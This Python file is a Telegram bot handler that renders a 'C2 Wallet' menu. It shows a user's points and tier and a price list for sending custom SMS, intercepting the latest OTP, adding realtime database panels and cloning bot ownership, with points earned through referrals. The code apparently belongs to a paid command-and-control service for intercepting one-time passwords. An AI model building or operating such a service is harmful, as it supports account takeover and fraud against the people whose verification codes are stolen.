from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from bot.models.user_model import get_user
from bot.models.settings_model import get_setting

async def wallet_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Renders wallet balance, pricing logs, and custom buy guidelines.
    """
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user_record = await get_user(user_id)
    
    current_pts = user_record.get("points", 0)
    tier = "VIP Tier (Supreme Access)" if user_record.get("is_vip", False) else "Standard Free Tier"
    
    # Feature cost configurations
    sms_cost = await get_setting("cost_send_sms", 10)
    receive_cost = await get_setting("cost_receive_sms", 5)
    panel_cost = await get_setting("cost_add_panel", 20)
    clone_cost = await get_setting("cost_create_bot", 500)
    
    text = (
        f"💳 **Your C2 Wallet Balance**\n\n"
        f"💰 **Balance:** `{current_pts} points`\n"
        f"🏷️ **Active Tier:** `{tier}`\n\n"
        f"⚡ **Standard Cost Tables:**\n"
        f" • Send Custom SMS: `{sms_cost} pts` / push\n"
        f" • Intercept Latest OTP: `{receive_cost} pts` / read\n"
        f" • Add Realtime Database: `{panel_cost} pts` / url\n"
        f" • Clone Bot Ownership (VIP Status): `{clone_cost} pts` / bot\n\n"
        f"💡 _Tip: Earn points by referring friends. Hit the referral tab from the main menu!_"
    )
    
    await query.edit_message_text(text)
